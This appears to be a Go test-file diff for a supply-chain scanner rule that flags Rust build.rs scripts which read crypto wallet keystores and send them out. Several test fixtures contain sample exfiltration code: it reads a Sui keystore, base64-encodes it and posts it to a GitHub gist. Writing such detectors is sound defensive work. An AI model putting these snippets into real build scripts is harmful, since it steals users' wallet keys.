@@ -610,3 +610,79 @@ func TestPyImportTimeRemoteJS_RequiresAllThreeSignals(t *testing.T) {
 		})
 	}
 }
+
+func rsBuildWalletExfilFires(t *testing.T, m *pattern.Matcher, relPath, content string) bool {
+	t.Helper()
+	findings, err := m.Analyze(context.Background(), &scanner.Target{RelPath: relPath, Content: []byte(content)})
+	require.NoError(t, err)
+	for _, f := range findings {
+		if f.RuleID == "RS_BUILD_WALLET_EXFIL_001" {
+			return true
+		}
+	}
+	return false
+}
+
+// TestRsBuildWalletExfil_TargetPrecision: the rule fires only in
+// build.rs (the build-time execution context). The same keystore-read +
+// network code in a regular source file or docs must NOT fire -- reading
+// a wallet at runtime in a wallet app is legitimate; the threat is a
+// build script doing it.
+func TestRsBuildWalletExfil_TargetPrecision(t *testing.T) {
+	m := fullBuiltinMatcher(t)
+	payload := "let k = std::fs::read_to_string(format!(\"{}/.sui/sui_config/sui.keystore\", home)).unwrap();\n" +
+		"ureq::post(\"https://api.github.com/gists\").send_string(&base64::encode(k));\n"
+
+	require.True(t, rsBuildWalletExfilFires(t, m, "build.rs", payload), "should fire in build.rs")
+	require.False(t, rsBuildWalletExfilFires(t, m, "src/main.rs", payload), "must not fire in a regular source file (runtime, not build-time)")
+	require.False(t, rsBuildWalletExfilFires(t, m, "README.md", payload), "must not fire in documentation")
+}
+
+// TestRsBuildWalletExfil_RequiresBothGroups: a build.rs needs BOTH a
+// keystore read AND a network exfil sink. Either alone is benign (a
+// build that reads a path without sending it; a build that calls the
+// network without touching a keystore; cc::Build native compilation).
+func TestRsBuildWalletExfil_RequiresBothGroups(t *testing.T) {
+	m := fullBuiltinMatcher(t)
+	cases := []struct {
+		name    string
+		content string
+	}{
+		{"keystore read, no network", "let k = std::fs::read_to_string(\"/home/u/.solana/id.json\").unwrap();\nprintln!(\"cargo:rerun-if-changed=build.rs\");\n"},
+		{"network, no keystore", "ureq::get(\"https://crates.io/api/v1/crates/foo\").call().unwrap();\n"},
+		{"cc::Build native compile", "cc::Build::new().file(\"src/native/foo.c\").compile(\"foo\");\n"},
+		{"docs-like wallet mention in a comment, no network", "// build.rs reads ~/.sui/sui_config/sui.keystore at app runtime, not here\n"},
+		// Keystore path only in a comment, plus a legitimate build-time
+		// network fetch. The path is not bound to a read API, so the
+		// keystore-read signal does not fire even though a network sink
+		// is present.
+		{"comment-only keystore path + legit network fetch", "// note: app reads ~/.sui/sui_config/sui.keystore at runtime\nlet meta = ureq::get(\"https://crates.io/api/v1/crates/foo\").call().unwrap();\n"},
+		// Path is CONSTRUCTED (PathBuf/join) but never read, plus a
+		// legitimate network fetch. Construction is not a read, so the
+		// keystore-read signal does not fire.
+		{"constructed keystore path (not read) + legit network", "let p = PathBuf::from(home).join(\".sui\").join(\"sui.keystore\");\nlet meta = ureq::get(\"https://crates.io/api/v1/crates/foo\").call().unwrap();\n"},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			require.False(t, rsBuildWalletExfilFires(t, m, "build.rs", tc.content),
+				"a missing behavior group must not produce a finding")
+		})
+	}
+}
+
+// TestRsBuildWalletExfil_CommentNearReadStillFires is a regression test
+// for an over-aggressive comment exclusion: a real keystore read with an
+// innocent comment a couple of lines above (the common shape of the
+// actual payload) must still fire. A prior exclude_patterns: ["^//"]
+// suppressed it because isExcluded scans up to 3 lines before the match.
+func TestRsBuildWalletExfil_CommentNearReadStillFires(t *testing.T) {
+	m := fullBuiltinMatcher(t)
+	payload := "fn main() {\n" +
+		"    // build-time keystore theft: read, encode, exfil\n" +
+		"    let home = std::env::var(\"HOME\").unwrap();\n" +
+		"    let k = std::fs::read_to_string(format!(\"{}/.sui/sui_config/sui.keystore\", home)).unwrap();\n" +
+		"    ureq::post(\"https://api.github.com/gists\").send_string(&base64::encode(k.as_bytes())).ok();\n" +
+		"}\n"
+	require.True(t, rsBuildWalletExfilFires(t, m, "build.rs", payload),
+		"a real keystore read must fire even with an innocent comment nearby")
+}
